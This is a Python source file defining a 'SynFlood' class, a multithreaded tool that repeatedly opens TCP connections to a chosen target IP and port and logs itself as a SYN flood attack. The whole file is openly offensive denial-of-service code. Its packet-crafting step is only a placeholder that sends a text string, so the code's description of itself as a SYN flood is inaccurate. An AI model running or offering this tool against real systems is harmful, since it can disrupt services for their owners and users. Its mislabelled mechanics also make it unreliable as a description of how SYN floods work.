import random
import logging
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore

init(autoreset=True)

class SynFlood:
    def __init__(self, target_ip, target_port, num_syns=1000, interval=0.1, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_syns = num_syns
        self.interval = interval
        self.num_threads = num_threads
        self.is_running = True
        self.syn_count = 0

        # Setup logging
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    def create_syn_packet(self):
        """Create a TCP SYN packet."""
        source_port = random.randint(1024, 65535)
        sequence_number = random.randint(1000, 9999)
        
        # Placeholder: Customize this to create an actual SYN packet if needed
        syn_packet = f"SYN packet: Source Port - {source_port}, Sequence Number - {sequence_number}".encode()
        
        return syn_packet

    def send_syn_packet(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        try:
            sock.connect((self.target_ip, self.target_port))
            sock.sendall(self.create_syn_packet())
            self.syn_count += 1
            logging.debug(Fore.GREEN + f"Sent SYN packet to {self.target_ip}:{self.target_port}")
        except ConnectionRefusedError:
            logging.error(Fore.RED + f"Connection refused to {self.target_ip}:{self.target_port}")
        except socket.error as e:
            logging.error(Fore.RED + f"Socket error sending SYN packet: {e}")
        finally:
            sock.close()

    def attack(self):
        logging.info(f"Starting SYN Flood attack to {self.target_ip}:{self.target_port}")

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [executor.submit(self._attack_thread) for _ in range(self.num_threads)]
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                logging.info(Fore.YELLOW + f"Stopping SYN Flood attack to {self.target_ip}:{self.target_port} due to cancellation")

        logging.info(f"SYN Flood attack to {self.target_ip}:{self.target_port} finished")

    def _attack_thread(self):
        while self.is_running and self.syn_count < self.num_syns:
            self.send_syn_packet()
            time.sleep(self.interval)

    def stop_attack(self):
        self.is_running = False
